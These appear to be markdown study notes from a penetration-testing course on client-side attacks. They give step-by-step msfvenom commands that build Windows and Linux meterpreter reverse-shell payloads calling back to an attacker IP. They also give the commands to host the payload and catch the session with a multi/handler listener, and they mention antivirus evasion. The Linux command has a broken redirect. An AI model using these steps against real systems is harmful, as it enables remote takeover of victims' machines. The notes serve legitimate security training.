## What are client-side attacks
* An attack vector that involves coercing a client to execute a malicioous payload.
* Typically utilizes social engineering. Eg: Malicious documents or portable executables (PEs).
* Take advantage of human vulnrabilities NOT vulns in services/softwares running on the target.
* As the transfer and storage of a malicious payload is required in this attack --> Thus attacker needs to take care of AV detections on the target.

##MSFVenom
* A command line utility used to generate and encode MSF payloads for various OS and web servers.
* MSFVeom = MSFPayload + MSFEncode

* **PRACTICAL**
* `msfvenom`--> documentation
* `msfvenom  --list payloads` --> List all the payloads that can be generated by msfvenom.
* General structure of payload: [OS]/[Architecture]/[payload_type]/[protocol to connect back to our system]
* Eg: windows/x64/meterpreter/reverse_tcp
* **Staged payload** --> Eg: The one above.
* **Non-staged payload** --> Eg: windows/x64/meterpreter_reverse_tcp
* ***
## Generate a payload

### Windows payloads
* `msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=[Attacker's IP] LPORT=[Any free port on attacker's machine] -f [file format of payload] > [location of the payload]/[name of the payload]`
* `msfvenom --list formats`--> List all the possible formats of the payloads

### Linux payloads
* `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP to connect back] LPORT=[any free port to connect back] -f elf < [location of the payload]/[name]` -->
* Where elf (Executable And Linkable Format) is the extension of a binary file.

### Transfer the payload to the target
* `sudo python -m SimpleHTTPServer 80` --> To receive the response from the web server that we are going to hack.
* `msfconsole` --> Setup the listener:
* `use multi/handler`
* `set payload windows/meterpreter/reverse_tcp`
* `set lhost [IP to be connected back]`
* `set lport[any port free on attacker's machine]`
* `run`
* Navigate to the target system and download the directory from the website.
* And execute the payload on the target
* This should give a meterpreter session through the listener that we setup initially.
* **To transfer a payload to a linux system**
* `set payload linux/x86/meterpreter/reverse_tcp`
* `run`
